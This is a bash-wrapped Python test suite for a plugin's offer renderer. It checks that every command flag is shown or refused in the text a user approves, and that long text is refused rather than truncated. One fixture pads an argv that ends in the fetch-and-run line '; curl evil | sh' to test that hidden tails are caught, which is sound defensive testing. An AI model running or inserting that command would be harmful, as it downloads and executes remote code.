#!/usr/bin/env bash
set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
AUTO_ROOT="$(cd "${SCRIPT_DIR}/../.." && pwd)"
PY="${CLAUDE_AUTO_PYTHON3:-/usr/bin/python3}"

echo "programme-offers-flags.test.sh"

"$PY" - "$AUTO_ROOT" <<'PY'
import json
import os
import pathlib
import shlex
import subprocess
import sys
import tempfile

root = pathlib.Path(sys.argv[1])
sys.path.insert(0, str(root / 'lib'))
sys.path.insert(0, str(root / 'tests' / 'fixtures'))
from _bootstrap import load_lib_module
from registered_transcript import transcript

PROG = str(root / 'lib/programme.py')
SID = 'offer-flags'
MARK = 'zzmark'
GIT = ['git', '-c', 'user.name=t', '-c', 'user.email=t@example.com']
RITUAL_FILE = '---\nwhen: at the release\nschedule: daily 10:00\n---\nSteps:\n- read the board\n'
BEHAVIOUR_FILE = '---\nwhen: work starts\nchecks:\n  - pm: the item exists\n---\nDo:\n- write a plan\n'

passed = failed = 0


def check(name, condition, detail=''):
    global passed, failed
    if condition:
        passed += 1
        print('  PASS ' + name)
    else:
        failed += 1
        print('  FAIL ' + name + ': ' + str(detail)[:1500])


with tempfile.TemporaryDirectory(prefix='auto-offers-flags-') as work:
    work = pathlib.Path(work)
    for key in list(os.environ):
        if key.startswith(('HERDR_', 'REX_', 'CLAUDE_AUTO_')):
            del os.environ[key]
    (work / 'secrets').write_text('')
    (work / 'shipped').mkdir()
    (work / 'shipped' / 'd1.md').write_text(BEHAVIOUR_FILE)
    (work / 'draft.md').write_text(BEHAVIOUR_FILE)
    fakes = work / 'fakes'
    fakes.mkdir()
    for tool in ('board', 'herdr'):
        (fakes / tool).write_text('#!/bin/sh\nexit 0\n')
        (fakes / tool).chmod(0o755)
    os.environ.update(CLAUDE_AUTO_DATA_DIR=str(work / 'data'), CLAUDE_AUTO_TASKS_DIR=str(work / 'tasks'),
                      CLAUDE_AUTO_TEST_HARNESS='1', CLAUDE_AUTO_MACHINE='studio', CLAUDE_PLUGIN_ROOT=str(root),
                      CLAUDE_AUTO_SECRETS_FILE=str(work / 'secrets'), CLAUDE_CODE_SESSION_ID=SID,
                      CLAUDE_AUTO_PERSONAL_PROTOCOL=str(work / 'personal' / 'protocol.json'),
                      CLAUDE_AUTO_CARRYOVER_STORE=str(work / 'personal' / 'carryover.json'),
                      CLAUDE_AUTO_RITUALS_STORE=str(work / 'stores' / 'rituals.json'),
                      CLAUDE_AUTO_BEHAVIOURS_STORE=str(work / 'stores' / 'behaviours.json'),
                      CLAUDE_AUTO_BEHAVIOURS_DIR=str(work / 'personal' / 'behaviours'),
                      CLAUDE_AUTO_SHIPPED_BEHAVIOURS_DIR=str(work / 'shipped'),
                      PATH=str(fakes) + os.pathsep + os.environ['PATH'])
    ph = load_lib_module('programme_home')
    pj = load_lib_module('programme_journal')
    ps = load_lib_module('programme_pick_source')
    pa = load_lib_module('programme_approval')
    core = load_lib_module('run_record_core')
    offers = load_lib_module('programme_offers')
    context = load_lib_module('programme_context')
    programme_module = load_lib_module('programme')
    run = ph.create_programme(['offer-flags'], SID)['run']

    def record():
        return core.read_run_record(ph.home_path(run), run)

    def edit(fn):
        core._with_locked_run_record(ph.home_path(run), run, fn)

    def verb(*args, stdin=''):
        return subprocess.run([sys.executable, PROG, *args, '--run', run], text=True, capture_output=True, input=stdin)

    def must(*args, stdin=''):
        result = verb(*args, stdin=stdin)
        assert result.returncode == 0, (args, result.stdout + result.stderr)
        return result

    # ---- One of everything a renderer reads ----
    repo = work / 'acme-repo'
    bare = work / 'acme-repo.git'
    subprocess.run(['git', 'init', '-q', '--bare', '-b', 'main', str(bare)], check=True)
    subprocess.run(['git', 'clone', '-q', str(bare), str(repo)], check=True, capture_output=True)
    subprocess.run(['git', '-C', str(repo), 'checkout', '-q', '-b', 'main'], capture_output=True)
    (repo / '.auto' / 'rituals').mkdir(parents=True)
    (repo / '.auto' / 'rituals' / 'versions.md').write_text(RITUAL_FILE)
    subprocess.run(['git', '-C', str(repo), 'add', '-A'], check=True)
    subprocess.run([*GIT, '-C', str(repo), 'commit', '-q', '-m', 'first'], check=True)
    subprocess.run(['git', '-C', str(repo), 'push', '-q', 'origin', 'main'], check=True, capture_output=True)
    subprocess.run(['git', '-C', str(repo), 'remote', 'set-head', 'origin', 'main'], check=True, capture_output=True)

    for key in ('mem:a', 'mem:b', 'mem:c', 'mem:d', 'mem:e', 'mem:handed', 'mem:dropped'):
        must('add-item', key, '--title', 'Title of ' + key)
    must('propose-rule', json.dumps({
        'id': 'rule-a', 'applies_when': {'change_kinds': ['evals_or_docs']}, 'requires': ['merged'],
        'evidence_bar': {'merged': 'merged at the gate'}, 'caveat': '', 'autonomy': 'act_and_tell',
        'added_by': 'pm', 'added_at': '2026-10-26T10:00:00Z', 'why': 'docs need a merge'}))
    must('propose-agreement', '--project-term', 'naming=use kebab case', '--source', 'brief')
    terms = record()['programme'].get('agreement', {}).get('project_terms') or \
        record()['programme'].get('project_terms') or []
    must('propose-behaviour', '--when', 'a bug comes in', '--do', 'write a test')
    must('propose-ritual', '--when', 'on Monday', '--trigger', 'end', '--step', 'read')

    def seed(rec):
        prog = rec['programme']
        prog['remit']['repos'] = [{'path': str(repo), 'github': 'acme/acme-repo'}]
        prog['items']['mem:handed'].update(state='handed', handed={'shown': {'fingerprint': 'x'}, 'question': 'Ship?'})
        prog['items']['mem:dropped']['state'] = 'dropped'
        prog['items']['mem:a']['repo'] = str(repo)
        prog['permission_proposals'].append(
            {'id': 'perm-a', 'state': 'open', 'operations': ['pr_checks'], 'rules': ['Bash(gh pr checks *)'],
             'settings_file': str(work / 'settings.local.json'), 'items': ['mem:a'], 'answers': [],
             'changed_at': '2026-01-01T00:00:00Z'})
        ctx = prog.setdefault(context.CONTEXT_KEY, {})
        base = {'at': '2026-01-01T00:00:00Z', 'source': {}, 'delta': None, 'supersedes': None, 'superseded_by': None,
                'accepted': None}
        ctx.setdefault('requirements', {})['req-a'] = [
            dict(base, rev=1, state='pending_acceptance', text='it works', checks=[])]
        ruling = dict(base, rev=1, kind='work_sequencing', effect='decided', applies_to=['programme'], limits=[],
                      until=None, scope='keep the order')
        ctx.setdefault('decisions', {}).update({
            'rul-a': [dict(ruling, state='accepted')], 'rul-b': [dict(ruling, state='pending_acceptance')]})
        ctx.setdefault('pauses', {})['pause-a'] = {'risk': 'prod', 'reason': 'stop it', 'items': [], 'state': 'active'}
        prog.setdefault(load_lib_module('programme_recovery').OPS_KEY, {})['op-1'] = {'state': 'uncertain', 'verb': 'start-worker'}
    edit(seed)

    programme = record()['programme']
    term_id = next(iter(t['id'] for t in (programme.get('project_terms') or terms) if isinstance(t, dict)), 'none')
    behaviour_id = programme['behaviours'][-1]['id']
    ritual_id = programme['rituals'][-1]['id']
    file_ref = 'acme/acme-repo/versions'
    draft = str(work / 'draft.md')

    # Every renderer's plainest real command. The table fails on a verb added without one.
    BASE = {
        'accept-agreement': ['accept-agreement'],
        'accept-context': ['accept-context', 'req-a'],
        'adopt-autonomy': ['adopt-autonomy', 'flip_terms_change_stage', 'propose'],
        'adopt-behaviour-file': ['adopt-behaviour-file', 'nb', '--file', draft],
        'adopt-check': ['adopt-check', 'owner/repo', 'verified.lookup', '["git", "status"]'],
        'adopt-ritual-file': ['adopt-ritual-file', file_ref],
        'adopt-rule': ['adopt-rule', 'rule-a'],
        'amend-term': ['amend-term', 'cadence', 'on_change'],
        'answer-handed': ['answer-handed', 'mem:handed', '--choice', 'ship'],
        'answer-permission': ['answer-permission', 'perm-a', 'not-now'],
        'carry-rulings': ['carry-rulings', 'rul-a'],
        'close-ruling': ['close-ruling', 'rul-a', '--as', 'withdrawn'],
        'copy-default': ['copy-default', 'd1'],
        'decline-ritual-file': ['decline-ritual-file', file_ref],
        'define-requirement': ['define-requirement', 'req-b', '--text', 'works', '--check', 'mem:a=merged'],
        'dispose-action': ['dispose-action', '--attempt', 'op-1', '--as', 'abandoned_unknown'],
        'drop-item': ['drop-item', 'mem:b'],
        'edit-project-term': ['edit-project-term', term_id, 'use snake case'],
        'end': ['end'],
        'handover': ['handover', 'session-other'],
        'keep-behaviours': ['keep-behaviours', behaviour_id, '--to', 'personal'],
        'keep-rituals': ['keep-rituals', ritual_id, '--to', 'personal'],
        'lift-pause': ['lift-pause', 'pause-a'],
        'move-behaviour': ['move-behaviour', behaviour_id, '--to', 'personal'],
        'move-ritual': ['move-ritual', ritual_id, '--to', 'personal'],
        'override-focus': ['override-focus', 'mem:c'],
        'record-behaviour': ['record-behaviour', '--when', 'on offers'],
        'record-ritual': ['record-ritual', '--when', 'at offers', '--trigger', 'end', '--step', 'read'],
        'record-ruling': ['record-ruling', 'rul-c', '--effect', 'decided', '--kind', 'work_sequencing', '--scope', 'a draft'],
        'reopen-item': ['reopen-item', 'mem:dropped'],
        'retire-behaviour': ['retire-behaviour', behaviour_id, '--as', 'retired'],
        'retire-ritual': ['retire-ritual', ritual_id, '--as', 'retired'],
        'run-ritual': ['run-ritual', ritual_id],
        'set-remit': ['set-remit'],
        'settle-default-update': ['settle-default-update', 'd1', '--as', 'keep'],
        'skip-ritual': ['skip-ritual', ritual_id],
        'start-ritual': ['start-ritual', ritual_id],
        'swap-item': ['swap-item', 'mem:d', 'mem:e'],
    }
    REMIT = {'tracker': {'teams': [{'key': 'AI', 'name': 'AI'}]}}
    # An option whose value the renderer checks: any other value is refused before it can reach the text.
    CHOSEN = {('answer-handed', 'kind'): 'evals_or_docs', ('define-requirement', 'check'): 'mem:b=merged',
              ('settle-default-update', 'file'): draft, ('adopt-behaviour-file', 'file'): draft}

    def doc_for(argv):
        return REMIT if argv[0] == 'set-remit' else None

    def rendering(argv):
        programme = record()['programme']
        out = offers.render(argv, programme, doc_for(argv))
        return out['label'] + ' ' + out['description']

    # ---- Offer, the routine sweep writes, then a pick ----
    check('the table names every renderer', set(BASE) == set(offers.RENDERERS), set(BASE) ^ set(offers.RENDERERS))
    printed = {}
    for name, argv in BASE.items():
        stdin = json.dumps(doc_for(argv)) if doc_for(argv) else ''
        result = verb('offer', 'routine-' + str(len(printed)), '--command', shlex.join(argv), stdin=stdin)
        check(f'{name} can be offered', result.returncode == 0, result.stdout + result.stderr)
        if result.returncode == 0:
            printed[name] = json.loads(result.stdout)

    must('sweep', '--record-sources')
    must('sweep-inputs', '--save')
    must('watcher-beat', 'w-routine', '--task-id', 'task-1', '--kind', 'cron')
    must('propose-permission')
    must('settle-permissions')
    must('status')

    def mark_shown(rec):
        rec['programme']['items']['mem:handed']['handed']['shown'] = {'fingerprint': 'later', 'at': '2026-11-05T00:00:00Z'}
    edit(mark_shown)

    path = transcript(SID)

    def pick(questions, answer):
        tool_use_id = 'toolu_' + os.urandom(6).hex()
        answers = {questions[0]['question']: answer}
        ask = {'type': 'assistant', 'uuid': 'a-' + tool_use_id, 'sessionId': SID, 'isSidechain': False,
               'message': {'role': 'assistant', 'content': [
                   {'type': 'tool_use', 'id': tool_use_id, 'name': 'AskUserQuestion', 'input': {'questions': questions}}]}}
        answered = {'type': 'user', 'uuid': 'u-' + tool_use_id, 'sessionId': SID, 'isSidechain': False,
                    'sourceToolAssistantUUID': 'a-' + tool_use_id,
                    'permissionDecision': {'decision': 'accept', 'source': 'user_temporary'},
                    'toolUseResult': {'questions': questions, 'answers': answers, 'annotations': {}},
                    'message': {'role': 'user', 'content': [
                        {'type': 'tool_result', 'tool_use_id': tool_use_id, 'content': 'answered'}]}}
        with path.open('a') as stream:
            stream.write(json.dumps(ask) + '\n' + json.dumps(answered) + '\n')
        source = ps.capture({'session_id': SID, 'transcript_path': str(path), 'tool_name': 'AskUserQuestion',
                             'tool_use_id': tool_use_id, 'tool_input': {'questions': questions},
                             'tool_response': {'answers': answers, 'questions': questions}})
        return pj.append_prompt(run, SID, ps.summary(answers), 'unknown', source=source, driving=True)['prompt_id']

    class Refused(Exception):
        def __init__(self, reason, fix=None):
            super().__init__(reason)

    for name, offered in printed.items():
        argv = BASE[name]
        questions = offered['input']['questions']
        answer = next(o['label'] for o in questions[0]['options'] if o['label'] != offered['decline'])
        prompt_id = pick(questions, answer)
        rows = pj.read(run)
        try:
            bound = pa._picked(rows, pj.find_prompt(run, prompt_id, rows), record(), pa.Asked(argv[0], argv, None, doc_for(argv)), prompt_id, Refused)
        except Refused as exc:
            bound = str(exc)
        check(f'{name}: a pick binds after the routine sweep writes', isinstance(bound, dict), bound)

    # ---- Every flag a verb parses is shown or refused ----
    seen = {}

    class Parsed(Exception):
        pass

    def spy(argv, *, values=(), flags=(), multi=()):
        seen[argv[0]] = (tuple(values), tuple(flags), tuple(multi))
        raise Parsed()

    real_parse = programme_module._parse
    programme_module._parse = spy
    for name in BASE:
        try:
            programme_module._VERBS[name].handler([name])
        except Parsed:
            pass
        except Exception as exc:
            check(f'{name}: its parser options can be read', False, repr(exc))
    programme_module._parse = real_parse
    check('the table read every verb\'s parser', set(seen) == set(BASE), set(BASE) - set(seen))

    # `offer` refuses on any exception; a bug's exception must not read as a refusal here.
    def refusing(call):
        try:
            return call(), None
        except (TypeError, AttributeError, KeyError, IndexError):
            raise
        except Exception as exc:
            return None, str(exc)

    def shown_or_refused(argv, want):
        text, why = refusing(lambda: rendering(argv))
        if why is not None:
            return True, f'refused: {why}'
        return all(w.casefold() in text.casefold() for w in want), text

    def plain(argv):
        return refusing(lambda: rendering(argv))[0]

    for name, (values, flags, multi) in sorted(seen.items()):
        base = BASE[name]
        for option in values + multi:
            if '--' + option in offers._NOT_BOUND or '--' + option in base:
                continue
            value = CHOSEN.get((name, option), MARK + option)
            ok, text = shown_or_refused([*base, '--' + option, value], [value])
            check(f'{name}: --{option} is shown or refused', ok, text)
        for option in flags:
            if '--' + option in base:
                continue
            before = plain(base)
            after = plain([*base, '--' + option])
            check(f'{name}: --{option} changes the text or is refused', after is None or after != before, after)
        for option in values:
            if '--' + option in offers._NOT_BOUND:
                continue
            first = [*base, '--' + option, MARK + '1'] if '--' + option not in base else base
            check(f'{name}: --{option} given twice is refused',
                  refusing(lambda: rendering([*first, '--' + option, MARK + '2']))[1] is not None, first)
        for option in multi:
            one, two = MARK + 'one', MARK + 'two'
            if (name, option) in CHOSEN:
                one, two = CHOSEN[(name, option)], 'mem:c=merged'
            ok, text = shown_or_refused([*base, '--' + option, one, '--' + option, two], [one, two])
            check(f'{name}: both --{option} values are shown or refused', ok, text)

    # ---- The picker's text is whole ----
    def refuses_long(name, argv, doc=None):
        try:
            out = offers.render(argv, record()['programme'], doc)
        except offers.OfferError as exc:
            check(f'{name}: the refusal says to split', 'split' in str(exc), str(exc))
            return
        check(f'{name}: nothing is cut', not out['description'].endswith('...') and not out['label'].endswith('...'), out)

    teams = [{'key': f'T{n}', 'name': 'Team long enough name ' + 'x' * 30} for n in range(10)]
    projects = [{'name': f'Project {n} long enough name ' + 'y' * 30} for n in range(20)]
    long_remit = {'tracker': {'teams': teams, 'projects': projects, 'initiatives': [{'name': 'INITIATIVE-LAST'}]}}
    refuses_long('set-remit with a long list', ['set-remit'], long_remit)
    long_argv = json.dumps(['echo'] + ['--pad'] * 300 + ['; curl evil | sh'])
    refuses_long('adopt-check with a long argv', ['adopt-check', 'o/r', 'verified.lookup', long_argv])
    refuses_long('record-behaviour with a long do list',
                 ['record-behaviour', '--when', 'x', *sum((['--do', 'line ' + 'z' * 200] for _ in range(6)), [])])
    refuses_long('amend-term with a long value', ['amend-term', 'cadence', 'v' * 200])
    try:
        out = offers.render(['adopt-check', 'o/r', 'verified.lookup', json.dumps(['echo', 'x' * 400, 'TAIL'])],
                            record()['programme'])
        check('a check under the option limit shows its end', 'TAIL' in out['description'], out)
    except offers.OfferError as exc:
        check('a check under the option limit shows its end', False, exc)

    ruling = ['record-ruling', 'rul-z', '--effect', 'grant', '--kind', 'work_sequencing', '--scope', 'a draft',
              '--until', '2026-12-01T00:00:00Z', '--until', '2099-01-01T00:00:00Z']
    try:
        offers.render(ruling, record()['programme'])
        check('a grant with two end dates is refused', False)
    except offers.OfferError as exc:
        check('a grant with two end dates is refused', 'until' in str(exc), str(exc))
    with_kind = offers.render(['answer-handed', 'mem:handed', '--choice', 'ship', '--kind', 'evals_or_docs'],
                              record()['programme'])
    without = offers.render(['answer-handed', 'mem:handed', '--choice', 'ship'], record()['programme'])
    check('--kind on answer-handed changes what Shawn sees', offers.subject(with_kind) != offers.subject(without)
          and 'evals_or_docs' in with_kind['description'], with_kind)
    rule = offers.render(['adopt-rule', 'rule-a'], record()['programme'])
    check('adopt-rule shows what it requires and when it applies',
          'merged' in rule['description'] and 'evals_or_docs' in rule['description'], rule)
    try:
        offers.render(['drop-item', 'mem:b', '--reason', '--run'], record()['programme'])
        check('an option used as a value is refused', False)
    except offers.OfferError as exc:
        check('an option used as a value is refused', '--reason' in str(exc), str(exc))

print(f'programme-offers-flags.test.sh: {passed} passed, {failed} failed')
sys.exit(1 if failed else 0)
PY
